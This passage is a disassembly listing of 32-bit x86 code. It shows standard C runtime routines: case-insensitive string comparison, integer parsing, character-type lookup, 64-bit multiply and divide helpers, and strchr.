  4288a4:	leave  
  4288a5:	ret    
  4288a6:	int3   
  4288a7:	int3   
  4288a8:	int3   
  4288a9:	int3   
  4288aa:	int3   
  4288ab:	int3   
  4288ac:	int3   
  4288ad:	int3   
  4288ae:	int3   
  4288af:	int3   
  4288b0:	push   ebp
  4288b1:	mov    ebp,esp
  4288b3:	push   edi
  4288b4:	push   esi
  4288b5:	push   ebx
  4288b6:	mov    esi,DWORD PTR [ebp+0xc]
  4288b9:	mov    edi,DWORD PTR [ebp+0x8]
  4288bc:	mov    al,0xff
  4288be:	mov    edi,edi
  4288c0:	or     al,al
  4288c2:	je     0x4288f6
  4288c4:	mov    al,BYTE PTR [esi]
  4288c6:	add    esi,0x1
  4288c9:	mov    ah,BYTE PTR [edi]
  4288cb:	add    edi,0x1
  4288ce:	cmp    ah,al
  4288d0:	je     0x4288c0
  4288d2:	sub    al,0x41
  4288d4:	cmp    al,0x1a
  4288d6:	sbb    cl,cl
  4288d8:	and    cl,0x20
  4288db:	add    al,cl
  4288dd:	add    al,0x41
  4288df:	xchg   al,ah
  4288e1:	sub    al,0x41
  4288e3:	cmp    al,0x1a
  4288e5:	sbb    cl,cl
  4288e7:	and    cl,0x20
  4288ea:	add    al,cl
  4288ec:	add    al,0x41
  4288ee:	cmp    al,ah
  4288f0:	je     0x4288c0
  4288f2:	sbb    al,al
  4288f4:	sbb    al,0xff
  4288f6:	movsx  eax,al
  4288f9:	pop    ebx
  4288fa:	pop    esi
  4288fb:	pop    edi
  4288fc:	leave  
  4288fd:	ret    
  4288fe:	push   esi
  4288ff:	push   edi
  428900:	call   0x4251f3
  428905:	mov    edi,DWORD PTR [eax+0x64]
  428908:	cmp    edi,DWORD PTR ds:0x45d58c
  42890e:	je     0x428917
  428910:	call   0x42669f
  428915:	mov    edi,eax
  428917:	mov    esi,DWORD PTR [esp+0xc]
  42891b:	cmp    DWORD PTR [edi+0x28],0x1
  42891f:	movzx  eax,BYTE PTR [esi]
  428922:	jle    0x428932
  428924:	push   0x8
  428926:	push   eax
  428927:	push   edi
  428928:	call   0x428986
  42892d:	add    esp,0xc
  428930:	jmp    0x42893c
  428932:	mov    ecx,DWORD PTR [edi+0x48]
  428935:	movzx  eax,BYTE PTR [ecx+eax*2]
  428939:	and    eax,0x8
  42893c:	test   eax,eax
  42893e:	je     0x428943
  428940:	inc    esi
  428941:	jmp    0x42891b
  428943:	movzx  ecx,BYTE PTR [esi]
  428946:	inc    esi
  428947:	cmp    ecx,0x2d
  42894a:	mov    edx,ecx
  42894c:	je     0x428953
  42894e:	cmp    ecx,0x2b
  428951:	jne    0x428957
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	xor    eax,eax
  428959:	cmp    ecx,0x30
  42895c:	jl     0x428968
  42895e:	cmp    ecx,0x39
  428961:	jg     0x428968
  428963:	sub    ecx,0x30
  428966:	jmp    0x42896b
  428968:	or     ecx,0xffffffff
  42896b:	cmp    ecx,0xffffffff
  42896e:	je     0x42897c
  428970:	lea    eax,[eax+eax*4]
  428973:	lea    eax,[ecx+eax*2]
  428976:	movzx  ecx,BYTE PTR [esi]
  428979:	inc    esi
  42897a:	jmp    0x428959
  42897c:	cmp    edx,0x2d
  42897f:	pop    edi
  428980:	pop    esi
  428981:	jne    0x428985
  428983:	neg    eax
  428985:	ret    
  428986:	push   ebp
  428987:	mov    ebp,esp
  428989:	push   ecx
  42898a:	mov    eax,DWORD PTR [ebp+0xc]
  42898d:	lea    ecx,[eax+0x1]
  428990:	cmp    ecx,0x100
  428996:	mov    ecx,DWORD PTR [ebp+0x8]
  428999:	ja     0x4289a4
  42899b:	mov    ecx,DWORD PTR [ecx+0x48]
  42899e:	movzx  eax,WORD PTR [ecx+eax*2]
  4289a2:	jmp    0x4289f8
  4289a4:	push   esi
  4289a5:	mov    edx,eax
  4289a7:	sar    edx,0x8
  4289aa:	push   edi
  4289ab:	mov    edi,DWORD PTR [ecx+0x48]
  4289ae:	movzx  esi,dl
  4289b1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289b6:	pop    edi
  4289b7:	pop    esi
  4289b8:	je     0x4289c9
  4289ba:	and    BYTE PTR [ebp-0x2],0x0
  4289be:	push   0x2
  4289c0:	mov    BYTE PTR [ebp-0x3],al
  4289c3:	mov    BYTE PTR [ebp-0x4],dl
  4289c6:	pop    eax
  4289c7:	jmp    0x4289d3
  4289c9:	and    BYTE PTR [ebp-0x3],0x0
  4289cd:	mov    BYTE PTR [ebp-0x4],al
  4289d0:	xor    eax,eax
  4289d2:	inc    eax
  4289d3:	push   0x1
  4289d5:	push   DWORD PTR [ecx+0x14]
  4289d8:	push   DWORD PTR [ecx+0x4]
  4289db:	lea    ecx,[ebp+0xe]
  4289de:	push   ecx
  4289df:	push   eax
  4289e0:	lea    eax,[ebp-0x4]
  4289e3:	push   eax
  4289e4:	push   0x1
  4289e6:	call   0x427a68
  4289eb:	add    esp,0x1c
  4289ee:	test   eax,eax
  4289f0:	jne    0x4289f4
  4289f2:	leave  
  4289f3:	ret    
  4289f4:	movzx  eax,WORD PTR [ebp+0xe]
  4289f8:	and    eax,DWORD PTR [ebp+0x10]
  4289fb:	leave  
  4289fc:	ret    
  4289fd:	int3   
  4289fe:	int3   
  4289ff:	int3   
  428a00:	mov    eax,DWORD PTR [esp+0x8]
  428a04:	mov    ecx,DWORD PTR [esp+0x10]
  428a08:	or     ecx,eax
  428a0a:	mov    ecx,DWORD PTR [esp+0xc]
  428a0e:	jne    0x428a19
  428a10:	mov    eax,DWORD PTR [esp+0x4]
  428a14:	mul    ecx
  428a16:	ret    0x10
  428a19:	push   ebx
  428a1a:	mul    ecx
  428a1c:	mov    ebx,eax
  428a1e:	mov    eax,DWORD PTR [esp+0x8]
  428a22:	mul    DWORD PTR [esp+0x14]
  428a26:	add    ebx,eax
  428a28:	mov    eax,DWORD PTR [esp+0x8]
  428a2c:	mul    ecx
  428a2e:	add    edx,ebx
  428a30:	pop    ebx
  428a31:	ret    0x10
  428a34:	int3   
  428a35:	int3   
  428a36:	int3   
  428a37:	int3   
  428a38:	int3   
  428a39:	int3   
  428a3a:	int3   
  428a3b:	int3   
  428a3c:	int3   
  428a3d:	int3   
  428a3e:	int3   
  428a3f:	int3   
  428a40:	push   ebp
  428a41:	mov    ebp,esp
  428a43:	push   edi
  428a44:	push   esi
  428a45:	push   ebx
  428a46:	mov    ecx,DWORD PTR [ebp+0x10]
  428a49:	or     ecx,ecx
  428a4b:	je     0x428a9a
  428a4d:	mov    esi,DWORD PTR [ebp+0x8]
  428a50:	mov    edi,DWORD PTR [ebp+0xc]
  428a53:	mov    bh,0x41
  428a55:	mov    bl,0x5a
  428a57:	mov    dh,0x20
  428a59:	lea    ecx,[ecx+0x0]
  428a5c:	mov    ah,BYTE PTR [esi]
  428a5e:	or     ah,ah
  428a60:	mov    al,BYTE PTR [edi]
  428a62:	je     0x428a8b
  428a64:	or     al,al
  428a66:	je     0x428a8b
  428a68:	add    esi,0x1
  428a6b:	add    edi,0x1
  428a6e:	cmp    ah,bh
  428a70:	jb     0x428a78
  428a72:	cmp    ah,bl
  428a74:	ja     0x428a78
  428a76:	add    ah,dh
  428a78:	cmp    al,bh
  428a7a:	jb     0x428a82
  428a7c:	cmp    al,bl
  428a7e:	ja     0x428a82
  428a80:	add    al,dh
  428a82:	cmp    ah,al
  428a84:	jne    0x428a91
  428a86:	sub    ecx,0x1
  428a89:	jne    0x428a5c
  428a8b:	xor    ecx,ecx
  428a8d:	cmp    ah,al
  428a8f:	je     0x428a9a
  428a91:	mov    ecx,0xffffffff
  428a96:	jb     0x428a9a
  428a98:	neg    ecx
  428a9a:	mov    eax,ecx
  428a9c:	pop    ebx
  428a9d:	pop    esi
  428a9e:	pop    edi
  428a9f:	leave  
  428aa0:	ret    
  428aa1:	int3   
  428aa2:	int3   
  428aa3:	int3   
  428aa4:	int3   
  428aa5:	int3   
  428aa6:	int3   
  428aa7:	int3   
  428aa8:	int3   
  428aa9:	int3   
  428aaa:	int3   
  428aab:	int3   
  428aac:	int3   
  428aad:	int3   
  428aae:	int3   
  428aaf:	int3   
  428ab0:	push   esi
  428ab1:	mov    eax,DWORD PTR [esp+0x14]
  428ab5:	or     eax,eax
  428ab7:	jne    0x428ae1
  428ab9:	mov    ecx,DWORD PTR [esp+0x10]
  428abd:	mov    eax,DWORD PTR [esp+0xc]
  428ac1:	xor    edx,edx
  428ac3:	div    ecx
  428ac5:	mov    ebx,eax
  428ac7:	mov    eax,DWORD PTR [esp+0x8]
  428acb:	div    ecx
  428acd:	mov    esi,eax
  428acf:	mov    eax,ebx
  428ad1:	mul    DWORD PTR [esp+0x10]
  428ad5:	mov    ecx,eax
  428ad7:	mov    eax,esi
  428ad9:	mul    DWORD PTR [esp+0x10]
  428add:	add    edx,ecx
  428adf:	jmp    0x428b28
  428ae1:	mov    ecx,eax
  428ae3:	mov    ebx,DWORD PTR [esp+0x10]
  428ae7:	mov    edx,DWORD PTR [esp+0xc]
  428aeb:	mov    eax,DWORD PTR [esp+0x8]
  428aef:	shr    ecx,1
  428af1:	rcr    ebx,1
  428af3:	shr    edx,1
  428af5:	rcr    eax,1
  428af7:	or     ecx,ecx
  428af9:	jne    0x428aef
  428afb:	div    ebx
  428afd:	mov    esi,eax
  428aff:	mul    DWORD PTR [esp+0x14]
  428b03:	mov    ecx,eax
  428b05:	mov    eax,DWORD PTR [esp+0x10]
  428b09:	mul    esi
  428b0b:	add    edx,ecx
  428b0d:	jb     0x428b1d
  428b0f:	cmp    edx,DWORD PTR [esp+0xc]
  428b13:	ja     0x428b1d
  428b15:	jb     0x428b26
  428b17:	cmp    eax,DWORD PTR [esp+0x8]
  428b1b:	jbe    0x428b26
  428b1d:	dec    esi
  428b1e:	sub    eax,DWORD PTR [esp+0x10]
  428b22:	sbb    edx,DWORD PTR [esp+0x14]
  428b26:	xor    ebx,ebx
  428b28:	sub    eax,DWORD PTR [esp+0x8]
  428b2c:	sbb    edx,DWORD PTR [esp+0xc]
  428b30:	neg    edx
  428b32:	neg    eax
  428b34:	sbb    edx,0x0
  428b37:	mov    ecx,edx
  428b39:	mov    edx,ebx
  428b3b:	mov    ebx,ecx
  428b3d:	mov    ecx,eax
  428b3f:	mov    eax,esi
  428b41:	pop    esi
  428b42:	ret    0x10
  428b45:	int3   
  428b46:	int3   
  428b47:	int3   
  428b48:	int3   
  428b49:	int3   
  428b4a:	int3   
  428b4b:	int3   
  428b4c:	int3   
  428b4d:	int3   
  428b4e:	int3   
  428b4f:	int3   
  428b50:	lea    eax,[edx-0x1]
  428b53:	pop    ebx
  428b54:	ret    
  428b55:	lea    esp,[esp+0x0]
  428b5c:	lea    esp,[esp+0x0]
  428b60:	xor    eax,eax
  428b62:	mov    al,BYTE PTR [esp+0x8]
  428b66:	push   ebx
  428b67:	mov    ebx,eax
  428b69:	shl    eax,0x8
  428b6c:	mov    edx,DWORD PTR [esp+0x8]
  428b70:	test   edx,0x3
  428b76:	je     0x428b8d
  428b78:	mov    cl,BYTE PTR [edx]
  428b7a:	add    edx,0x1
  428b7d:	cmp    cl,bl
  428b7f:	je     0x428b50
  428b81:	test   cl,cl
  428b83:	je     0x428bd6
  428b85:	test   edx,0x3
  428b8b:	jne    0x428b78
  428b8d:	or     ebx,eax
  428b8f:	push   edi
  428b90:	mov    eax,ebx
  428b92:	shl    ebx,0x10
  428b95:	push   esi
  428b96:	or     ebx,eax
  428b98:	mov    ecx,DWORD PTR [edx]
  428b9a:	mov    edi,0x7efefeff
  428b9f:	mov    eax,ecx
  428ba1:	mov    esi,edi
  428ba3:	xor    ecx,ebx
  428ba5:	add    esi,eax
  428ba7:	add    edi,ecx
  428ba9:	xor    ecx,0xffffffff
  428bac:	xor    eax,0xffffffff
  428baf:	xor    ecx,edi
  428bb1:	xor    eax,esi
  428bb3:	add    edx,0x4
  428bb6:	and    ecx,0x81010100
  428bbc:	jne    0x428bda
  428bbe:	and    eax,0x81010100
  428bc3:	je     0x428b98
  428bc5:	and    eax,0x1010100
  428bca:	jne    0x428bd4
  428bcc:	and    esi,0x80000000
  428bd2:	jne    0x428b98
  428bd4:	pop    esi
  428bd5:	pop    edi
  428bd6:	pop    ebx
  428bd7:	xor    eax,eax
  428bd9:	ret    
  428bda:	mov    eax,DWORD PTR [edx-0x4]
  428bdd:	cmp    al,bl
  428bdf:	je     0x428c17
  428be1:	test   al,al
  428be3:	je     0x428bd4
  428be5:	cmp    ah,bl
  428be7:	je     0x428c10
  428be9:	test   ah,ah
  428beb:	je     0x428bd4
  428bed:	shr    eax,0x10
  428bf0:	cmp    al,bl
  428bf2:	je     0x428c09
  428bf4:	test   al,al
  428bf6:	je     0x428bd4
  428bf8:	cmp    ah,bl
  428bfa:	je     0x428c02
  428bfc:	test   ah,ah
  428bfe:	je     0x428bd4
  428c00:	jmp    0x428b98
  428c02:	pop    esi
  428c03:	pop    edi
  428c04:	lea    eax,[edx-0x1]
  428c07:	pop    ebx
  428c08:	ret    
  428c09:	lea    eax,[edx-0x2]
  428c0c:	pop    esi
  428c0d:	pop    edi
  428c0e:	pop    ebx
  428c0f:	ret    
  428c10:	lea    eax,[edx-0x3]
  428c13:	pop    esi
  428c14:	pop    edi
  428c15:	pop    ebx
  428c16:	ret    
  428c17:	lea    eax,[edx-0x4]
  428c1a:	pop    esi
  428c1b:	pop    edi
  428c1c:	pop    ebx
  428c1d:	ret    
  428c1e:	jmp    DWORD PTR ds:0x429100
